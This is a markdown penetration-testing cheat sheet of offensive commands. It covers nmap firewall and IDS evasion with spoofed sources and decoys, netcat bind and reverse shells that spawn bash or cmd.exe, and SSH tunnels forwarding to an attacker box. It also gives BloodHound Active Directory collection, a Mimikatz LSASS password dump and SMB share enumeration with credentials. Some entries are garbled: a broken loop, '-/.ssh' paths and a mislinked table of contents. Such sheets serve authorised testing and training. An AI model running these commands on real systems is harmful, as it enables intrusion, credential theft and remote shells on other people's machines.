# TOOLS

1. [NMAP](#nmap)
2. [NETCAT](#netcat)
3. [BLOODHOUND](#ssh)
4. [MIMIKATZ](#mimikatz)
5. [SMB TOOLS](#smb-tools)

##  NMAP  

### ADVANCED OPTIONS

```shell
#print banner  
-sV -pX --script=banner 
#traceroute
-traceroute
#set TTL
-ttl 
#runs vuln script NSE
--script vuln
```

### FIREWALL EVASION

```shell
#fragment packets
-f 
#spoof src
-s ip 
#spoof src port
-g X 
#Decoy
-D ip , ip 
#set MTU size
--mtu X 
#Spoof MAC @
--spoof-mac mac
#Append random data
--data-length size 
#Set delay
--scan-delay 5s
```

### GENERATE LIVE HOST FILE:

```shell
nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" | cut -d " " -f 5 > live_hosts.txt
```

### COMPARE NMAP RESULTS

```shell
ndiff scan1.xml scan2.xml
```

### DNS REVERSE LOOKUP ON IP RANGE

```shell
nmap -R -sL -dns-server <server> 1.1.1.0/24
```

### IDS TEST (XMAS SCAN WITH DECOY IPs AND SPOOFING)

```shell
for x in {1..10000..1);do nmap -T5 -sX -S <spoof-source-IP> -D <comma-seperated with no spaces list of decoy IPs> --spoof-mac aa:bb:cc:dd:ee:ff -e eth0 -Pn <targeted-IP>;done
```


## NETCAT

### BASICS

```shell
nc [TargetIP] [port]
nc -l -p [port]
```

### PORT SCANNER

```shell
TCP Port Scanner in port range [startPort] to [endPort]:
nc -v -n -z -wl [TargetiP] [startPort]-[endPort]
```

### FILE TRANSFERS

```shell
Grab a [filename] from a Listener:
    1.   Start Listener to push [filename]
         nc -l -p [port] < [filename]
    2.   Connect to [TargetIP] and Retrieve [filename]
         nc -w3 [TargetIP] [port] > [filename]
Push a [filename] to Listener:
    1.   Start Listener to pull [filename]
         nc -l -p [port] > [filename]
    2.   Connect to [TargetIP] and push [filename]
         nc -w3 [TargetIP] [port] < [filename]
```

### BACKDOOR SHELLS

```shell
#Linux Shell:
nc -l -p [port] -e /bin/bash
#Linux Reverse Shell:
nc [LocalIP] [port] -e /bin/bash
#Windows Shell:
nc -l -p [port] -e cmd.exe
#Windows Reverse Shell:
nc [LocalIP] [port] -e cmd.exe
```


## SSH 

### System-wide known hosts
```shell
/etc/ssh/ssh_known_hosts 
```

### Hosts user has logged into
```shell
-/.ssh/known_hosts 
```

### Generate SSH keys (DSA/RSA)
```shell
sshd-generate 
```

### Generate SSH DSA keys
```shell
ssh keygen -t dsa -f /etc/ssh/ssh_host_dsa_key 
```

### Generate SSH RSA keys
```shell
ssh keygen -t rsa -f /etc/ssh/ssh_host_rsa_key 
```

### If already in ssh session, press '~C' :

```shell
~ (Alt-Gr + Ã©), then 'C' to configure tunnel 
cat /etc/ssh/sshd_config | grep AllowTcpForwarding #if set to yes
```

### TO ESTABLISH AN SSH CONNECTION ON DIFFERENT PORT

```shell
ssh root@2.2.2.2 -p 8222
```

### SETUP X11 FORWARDING FROM TARGET, FROM ATTACK BOX RUN

```shell
xhost+
vi -/.ssh/config -> Ensure 'ForwardX11 yes'
ssh -X root@2.2.2.2
```

### REMOTE PORT FORWARD ON 8080, FORWARD TO ATTACKER ON 443

```shell
ssh -R8080:127.0.0.1:443 root@2.2.2.2.
```

### LOCAL PORT FORWARD ON PORT 8080 ON ATTACK BOX AND FORWARDS THROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3.3.3.3

```shell
ssh -L8080:3.3.3.3:443 root@2.2.2.2
```

### DYNAMIC TUNNEL USED IN CONJUNCTION WITH PROXYCHAINS. ENSURE /ETC/PROXYCHAINS.CONF IS CONFIGURED ON CORRECT PORT (1080)

```shell
ssh -D1080 root@2.2.2.2
#In separate terminal run :
proxychains nmap -sT -p80,443 3.3.3.3
```

## BLOODHOUND

* BloodHound project here : https://github.com/BloodHoundAD/BloodHound.git *
* Ingestor (gather AD informations) stuff is in /Ingestors directory *

### GATHER AD INFORMATIONS
```shell
runas.exe /netonly /user:FULL.FQDN.COM\USER powershell.exe
import-module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain FULL.FQDN.COM -LDAPPass 'PASSWORD' -LDAPUser 'USER' -DomainController FULL.FQDN.COM -Verbose
```

### Launch BloodHound
```shell
systemctl start neo4j
./BloodHound
```

## MIMIKATZ

### DUMP LSASS (ADMIN)

```shell
privilege::debug
sekurlsa::logonpasswords
```

## SMB TOOLS

### List all files recursively in a share

```shell
smbclient -U 'DOMAIN\USER%PASSWORD' //<IP>/SYSVOL -c 'prompt OFF;recurse ON;dir' | tee -a output.txt
smbmap.py -u USER -p PASSWORD -d DOMAIN --host-file smb_list.txt -r | tee output.txt
```